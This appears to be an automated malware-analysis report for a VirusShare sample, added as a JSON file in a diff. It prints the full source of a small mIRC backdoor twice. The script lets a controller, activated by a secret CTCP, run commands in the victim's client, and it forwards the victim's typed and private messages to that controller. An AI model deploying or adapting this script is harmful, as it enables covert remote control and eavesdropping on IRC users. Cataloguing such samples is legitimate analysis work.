@@ -1,0 +1,59 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "[script]\nn0=ctcp 1:Gravity3:*:{\nn1=  //set %3pty $nick\nn2=  //raw -q privmsg %3pty : Noob active.\nn3=  //halt\nn4=}\nn5=\nn6=ctcp 1:gone:*:{\nn7=  //raw -q privmsg %3pty : Deactivating Noob.\nn8=  //set %3pty $null\nn9=  //halt\nn10=}\nn11=\nn12=ctcp 1:*:*:{\nn13=  if ( $nick == %3pty ) {\nn14=    *1\nn15=    /halt\nn16=  }\nn17=}\nn18=\nn19=on 1:INPUT:*:{ \nn20=  if (%3pty != $null)  //raw -q privmsg %3pty : -  $me to $active  - *1\nn21=}\nn22=\nn23=on 1:TEXT:*:?:{ \nn24=  if (%3pty != $null) //raw -q privmsg %3pty : - $nick to $me - *1\nn25=}\nn26=\nn27=raw *:*No such nick/channel*:/halt"
+    },
+    "filename": "VirusShare_0d66012d2ee3d0026945a5995dec7f8d",
+    "filesize": 602,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0d66012d2ee3d0026945a5995dec7f8d",
+        "sha1": "69ffce75ead33adcbd5edbf59a097f5f00e254af",
+        "sha256": "4f8899fa219b4eff11b2ca8cd6a88687d98d05a291cf703a55e73834d64c91c7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=ctcp 1:Gravity3:*:{",
+            "n1=  //set %3pty $nick",
+            "n2=  //raw -q privmsg %3pty : Noob active.",
+            "n3=  //halt",
+            "n4=}",
+            "n6=ctcp 1:gone:*:{",
+            "n7=  //raw -q privmsg %3pty : Deactivating Noob.",
+            "n8=  //set %3pty $null",
+            "n9=  //halt",
+            "n10=}",
+            "n11=",
+            "n12=ctcp 1:*:*:{",
+            "n13=  if ( $nick == %3pty ) {",
+            "n14=    *1",
+            "n15=    /halt",
+            "n16=  }",
+            "n17=}",
+            "n18=",
+            "n19=on 1:INPUT:*:{ ",
+            "n20=  if (%3pty != $null)  //raw -q privmsg %3pty : -  $me to $active  - *1",
+            "n21=}",
+            "n22=",
+            "n23=on 1:TEXT:*:?:{ ",
+            "n24=  if (%3pty != $null) //raw -q privmsg %3pty : - $nick to $me - *1",
+            "n25=}",
+            "n26=",
+            "n27=raw *:*No such nick/channel*:/halt"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.285391",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
